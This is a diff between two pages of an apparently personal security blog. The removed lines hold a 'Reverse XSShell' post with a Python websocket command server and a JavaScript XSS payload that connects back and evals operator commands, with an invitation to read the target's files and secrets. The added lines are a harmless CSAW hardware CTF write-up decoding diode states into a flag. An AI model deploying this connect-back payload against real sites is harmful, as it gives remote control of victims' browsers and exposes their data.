@@ -17,21 +17,21 @@
     
     
 
-<title>Reverse XSShell • Think
+<title>CSAW - Short Circuit • Think
 Love
 Share</title>
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Reverse XSShell"/>
-<meta name="twitter:description" content="Having some fun playing with xss and websockets. A different approach to reverse shell and their contexts!"/>
+<meta name="twitter:title" content="CSAW - Short Circuit"/>
+<meta name="twitter:description" content="Hardware challenge on paper! This task consists in getting the internal state of a (simple) circuit, bit by bit, and convert it to ascii texte. "/>
 
-<meta property="og:title" content="Reverse XSShell" />
-<meta property="og:description" content="Having some fun playing with xss and websockets. A different approach to reverse shell and their contexts!" />
+<meta property="og:title" content="CSAW - Short Circuit" />
+<meta property="og:description" content="Hardware challenge on paper! This task consists in getting the internal state of a (simple) circuit, bit by bit, and convert it to ascii texte. " />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://thinkloveshare.com/en/hacking/reverse_xsshell/" />
-<meta property="article:published_time" content="2020-02-22T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-02-22T00:00:00+00:00" />
+<meta property="og:url" content="https://thinkloveshare.com/en/hacking/short_circuit/" />
+<meta property="article:published_time" content="2018-09-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-09-16T00:00:00+00:00" />
 
 
     
@@ -166,7 +166,7 @@ Share</a>
     </p>
     <div class="langSection">
     
-    <a rel="alternate" href="/en/hacking/reverse_xsshell/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
+    <a rel="alternate" href="/en/hacking/short_circuit/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
     </div>
     <p class="copyright">
       &copy; 2021 Laluka.
@@ -182,12 +182,12 @@ Share</a>
             
     <article>
   <header>
-    <h1>Reverse XSShell</h1>
+    <h1>CSAW - Short Circuit</h1>
     
     
 <div class="post__meta">
     
-      <i class="fas fa-calendar-alt"></i> Feb 22, 2020
+      <i class="fas fa-calendar-alt"></i> Sep 16, 2018
     
     
     <i class="fas fa-clock"></i> 2 min read
@@ -204,106 +204,98 @@ Share</a>
   <div class="post">
     
 
-<h1 id="the-initial-idea">The initial idea</h1>
-
-<p>While auditing a website, I found out they were using websockets to transmit data. I didn&rsquo;t kow much about it so I had to <a href="https://rtfm.re/">ReadTheFancyManual</a>. Once I understood that it was&hellip; Well&hellip; A socket one could use with web technologies, I asked myself &ldquo;What do I usually do with sockets?&rdquo;</p>
-
-<p>Tunnels! Transfer files! Or&hellip; Spawn reverse shells?!</p>
-
-<p>Or&hellip; Spawn a reverse XSShell??</p>
-
-<h1 id="what-do-we-need">What do we need?</h1>
-
-<h2 id="a-websocket-server">A websocket server</h2>
-
-<pre><code class="language-python">import asyncio
-import websockets
-
-
-async def hello(websocket, path):
-    print(&quot;WebSocket received&quot;)
-
-    while True:
-        cmd = input(&quot;cmd &gt; &quot;)
-        await websocket.send(cmd)
-        print(f&quot;sent: {cmd}&quot;)
-
-        out = await websocket.recv()
-        print(f&quot;out : {out}\n&quot;)
-
-start_server = websockets.serve(hello, &quot;localhost&quot;, 8080)
-
-asyncio.get_event_loop().run_until_complete(start_server)
-asyncio.get_event_loop().run_forever()
-</code></pre>
-
-<h2 id="some-javascript-to-connect-back">Some javascript to connect back</h2>
-
-<ul>
-<li><p>Readable version</p>
-
-<pre><code class="language-javascript">var socket = new WebSocket(&quot;ws://localhost:8080/&quot;);
-
-socket.onopen = function() {
-console.log(&quot;Connected!&quot;);
-};
-
-socket.onmessage = function(event) {
-console.log(&quot;Cmd received&quot;, event.data);
-socket.send(eval(event.data));
-// socket.close();
-};
-</code></pre></li>
-
-<li><p>Actual payload I use</p>
-
-<pre><code class="language-javascript">s=new WebSocket(&quot;ws://localhost:8080/&quot;),s.onmessage=function(ev){try{s.send(eval(ev.data))}catch(e){s.send(e)}};
-</code></pre></li>
-</ul>
-
-<h2 id="an-html-page-to-execute-the-payload">An html page to execute the payload</h2>
+<h3 id="description">Description</h3>
 
 <blockquote>
-<p>Who cares about html anyway?</p>
+<p>Start from the monkey&rsquo;s paw and work your way down the high voltage line,
+for every wire that is branches off has an element that is either on or off.
+Ignore the first bit. Standard flag format.</p>
+
+<p>-Elyk</p>
 </blockquote>
 
-<h2 id="in-short">In short</h2>
+<h3 id="tl-dr">TL;DR</h3>
 
-<p>You can find the code here: <a href="https://gitlab.com/TheLaluka/ctf_utils/-/tree/master/web/websocket_xss">https://gitlab.com/TheLaluka/ctf_utils/-/tree/master/web/websocket_xss</a></p>
+<p>This challenge consists in the analysis of a lovely electronic scheme.<br />
+It is composed of diodes, wires, wires, wires and wires.<br />
+The goal is to extract bits of data from the circuit.</p>
 
-<p>And what this gives us is a reverse shell in a javascript (browser / renderer) context. What you can do from here is up to you.. Try to read files, query the network, mess with your target&rsquo;s DOM or secrets&hellip; Have fun ! :)</p>
+<p>The task was not really hard, but if you have a bad sight, you&rsquo;re gonna have a bad time.</p>
 
-<h1 id="demo">Demo</h1>
+<h3 id="methology">Methology</h3>
 
-<p><img class="img_big" src="/en/hacking/reverse_xsshell/demo.png" alt="demo"></p>
-
-<h1 id="limitations">Limitations</h1>
+<p>Few things to know, here are the keys :</p>
 
 <ul>
-<li>You still need an xss with little restrictions (use eval, long payload, &hellip;)</li>
-<li>The reverse xsshell can be blocked on its way back by a firewall / proxy / SOP / CSP / &hellip;</li>
-<li>Blocking actions (alert, prompt, redirect, &hellip;) will break the current shell (trig xss again!)</li>
+<li>If a diode is attached to VCC on its flat side and 0 (aka GND) on its pointy side, it&rsquo;ll be <strong>ON</strong></li>
+<li>If it&rsquo;s the opposite, it&rsquo;ll be <strong>OFF</strong> (yup, direction matters !)</li>
+<li>If the input and output are attached to the same wire, it&rsquo;s <strong>OFF</strong></li>
 </ul>
 
-<h1 id="appendix">Appendix</h1>
+<p><img class="img_full" src="/en/hacking/short_circuit/paper.png" alt="paper" ></p>
 
-<p>Once again, after spending some time experimenting a new idea, I start google it and&hellip; Well, it&rsquo;s not <em>really</em> something new. It&rsquo;s just about re-discovering <a href="https://github.com/raz-varren/xsshell">what others found before</a>. That being said, I love one-liners and keeping things as simple as possible, so it&rsquo;s not the same-same.. :)</p>
+<p>By using these rules, we extract the bits one by one, with our eyes glitching hard, and we obtain :</p>
 
-<p><img class="img_big" src="/en/hacking/reverse_xsshell/same_but_different.gif" alt="same_but_different"></p>
+<p><code>01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001 01101000 01100001 01101110 01100100 01111101</code></p>
+
+<h2 id="once-decoded-flag-owmyhand">Once decoded : <strong>flag{owmyhand}</strong></h2>
+
+<p>author: &ldquo;Laluka&rdquo;
+title: &ldquo;CSAW - Short Circuit&rdquo;
+slug: &ldquo;short_circuit&rdquo;
+date: 2018-09-16
+status: &ldquo;translated&rdquo;</p>
+
+<h2 id="description-challenge-hardware-sur-papier-cette-épreuve-consiste-à-récupérer-l-état-interne-d-un-simple-cirtuit-imprimé-dessiné-bit-par-bit-puis-d-encoder-le-résultat-en-ascii">description: &ldquo;Challenge hardware sur papier ! Cette épreuve consiste à récupérer l&rsquo;état interne d&rsquo;un (simple) cirtuit imprimé (dessiné), bit par bit, puis d&rsquo;encoder le résultat en ascii. &ldquo;</h2>
+
+<h3 id="description-1">Description</h3>
+
+<blockquote>
+<p>Commencez à la patte du singe et descendez la ligne à haute tension,
+pour chaque fil branché a un élément, prenez une valeur on ou off. Ignorez la première partie. Format de flag standard.</p>
+
+<p>-Elyk</p>
+</blockquote>
+
+<h3 id="tl-dr-1">TL;DR</h3>
+
+<p>Ce challenge consiste en l&rsquo;analyse d&rsquo;un superbe schéma électronique. <br />
+Il est composé de diodes, de fils, de fils, de fils, de fils et de fils. <br />
+Le but est d&rsquo;extraire des bits de données du circuit.</p>
+
+<p>Cette épreuve n&rsquo;était pas très complexe, mais si vous avez une mauvaise vue, vous allez passer un mauvais quart d&rsquo;heure.</p>
+
+<h3 id="methologie">Methologie</h3>
+
+<p>Peu de choses à savoir, voici les clés :</p>
+
+<ul>
+<li>Si une diode est fixée au VCC sur son côté plat et 0 (aka GND) sur son côté pointu, elle sera <strong>ON</strong>.</li>
+<li>Si c&rsquo;est le contraire, elle sera <strong>OFF</strong> (ouep, le sense compte !)</li>
+<li>Si l&rsquo;entrée et la sortie sont reliées au même fil, elle est <strong>OFF</strong>.</li>
+</ul>
+
+<p><img class="img_full" src="/en/hacking/short_circuit/paper.png" alt="paper" ></p>
+
+<p>En utilisant ces règles, on extrait les bits un par un, avec nos yeux en galère, et on obtient finalement :</p>
+
+<p><code>01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001 01101000 01100001 01101110 01100100 01111101</code></p>
+
+<p>Une fois décodé : <strong>flag{owmyhand}</strong></p>
 
   </div>
   
 
 <div class="post--navigation post--navigation-single">
     
-    <a href="/en/hacking/infosec_made_easy/" class="post--navigation-prev">
+    <a href="/en/hacking/excess_ess_1/" class="post--navigation-prev">
       <i aria-hidden="true" class="fa fa-chevron-left"></i>
-      <span class="navigation-tittle">Infosec made easy</span>
+      <span class="navigation-tittle">Security Fest - Excess ess 1</span>
     </a>
     
     
-    <a href="/en/hacking/a_helping_hand/" class="post--navigation-next">
-      <span class="navigation-tittle">A Helping Hand</span>
+    <a href="/en/hacking/shell_code/" class="post--navigation-next">
+      <span class="navigation-tittle">CSAW - Shell-&gt;Code</span>
       <i aria-hidden="true" class="fa fa-chevron-right"></i>
     </a>
     
